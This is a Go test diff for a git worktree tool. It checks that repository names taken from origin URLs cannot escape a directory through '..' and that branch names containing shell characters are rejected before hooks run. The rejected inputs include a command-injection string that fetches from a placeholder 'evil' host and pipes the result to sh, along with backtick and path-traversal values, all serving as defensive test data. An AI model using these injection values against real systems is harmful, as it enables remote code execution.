@@ -217,3 +217,47 @@ func TestAddWorktreeBaseIsNotAnOption(t *testing.T) {
 		t.Fatal(err)
 	}
 }
+
+// An origin whose last element is ".." (or empty) must not become the
+// directory name under ~/worktrees: Join would climb out of it.
+func TestRepoNameIsOnePathElement(t *testing.T) {
+	dir := newRepo(t, filepath.Join(t.TempDir(), "app"))
+	git(t, dir, "remote", "add", "origin", "x:y")
+	for _, origin := range []string{"x:..", "https://github.com/a/..", "x:.", "https://github.com/a/../", "..", "x:a/..\\.."} {
+		git(t, dir, "remote", "set-url", "origin", origin)
+		n := RepoName(dir)
+		if !pathElem(n) || n == ".." {
+			t.Errorf("origin %q: RepoName = %q", origin, n)
+		}
+		id, err := RepoID(dir)
+		if err != nil || !pathElem(id) {
+			t.Errorf("origin %q: RepoID = %q, %v", origin, id, err)
+		}
+	}
+	git(t, dir, "remote", "set-url", "origin", "git@github.com:me/tool.git")
+	if n := RepoName(dir); n != "tool" {
+		t.Fatalf("RepoName = %q, want tool", n)
+	}
+}
+
+// Branch names go into [hooks] commands as {{branch}}: a name with shell
+// characters is refused before anything is made; ordinary ones pass.
+func TestCheckBranchName(t *testing.T) {
+	for _, bad := range []string{
+		"x$(curl${IFS}-s${IFS}evil|sh)", "x`id`", "a;b", "a|b", "a&b", "it's", `a"b`, `a\b`,
+		"a b", "a\tb", "a\nb", "a(b", "a)b", "a{b}", "a<b", "a>b", "a*", "a?", "a[b]", "~a", "a!", "#a", "a\x00b", "a\x7fb", "a\u3000b",
+		"-x", "",
+	} {
+		if bad == "" {
+			continue
+		}
+		if err := CheckBranchName(bad); err == nil {
+			t.Errorf("%q accepted", bad)
+		}
+	}
+	for _, ok := range []string{"feat/x", "fix/login-safari", "release/1.2", "feat/12-csv_export", "pr-12", "feat/issue-7-csv-export", "user@host", "日本語"} {
+		if err := CheckBranchName(ok); err != nil {
+			t.Errorf("%q refused: %v", ok, err)
+		}
+	}
+}
